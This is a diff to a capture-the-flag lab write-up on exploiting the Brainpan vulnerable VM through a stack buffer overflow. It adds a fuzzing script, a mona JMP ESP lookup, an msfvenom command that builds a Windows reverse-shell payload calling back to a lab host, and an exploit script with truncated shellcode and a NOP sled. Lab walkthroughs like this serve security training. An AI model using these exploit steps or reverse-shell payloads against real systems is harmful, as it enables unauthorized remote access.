@@ -158,27 +158,42 @@ Exactly 524 bytes of junk is needed to get us to the EIP.
 
 Now our payload will look like this: `"A"*524+"B"*4+"C"*(900-524-4)`
 
-Our shellcode will be put just behind the 4 bytes that control EIP (at offset 524)
+```
+import socket
 
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('192.168.56.105',9999))
 
-Setting JMP ESP address and shellcode
+payload = "A"*524 + "B"*4 + "C"*(900-524-4)
+
+print s.recv(1024)
+s.send(payload+"\r\n")
+print s.recv(1024)
+
+s.close()
+```
+After executing this script the EIP gets overwritten with 42424242
+
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/Access-violation-42424242.png)
+
+## 3. Setting JMP ESP address and shellcode
 
 `!mona jump -r ESP`
 
-`0x31170000` <- no ASLR
+`0x31170000` <- module with no SafeSEH and ASLR protection
 
 `msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
 
 
 ```
-import socket, sys
+import socket
 
 buf = ("\xb8\xf9\...\...\...\..."
 "\xc9\xb1\...\..\...\...\...\..."
 "...
 "...
 ...
-"\x92\x7c\xa6\xf6")
+"\x92\x7c\xa6\xf6") 
 
 payload = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -192,10 +207,10 @@ s.recv(1024)
 s.send(payload)
 ```
 
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/nc-nlvp-4444.png)
 
 
-
-![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/generating-shellcode.png?raw=true)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/generating-shellcode.png)
 
 ![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/root%40brainpan.png)
 
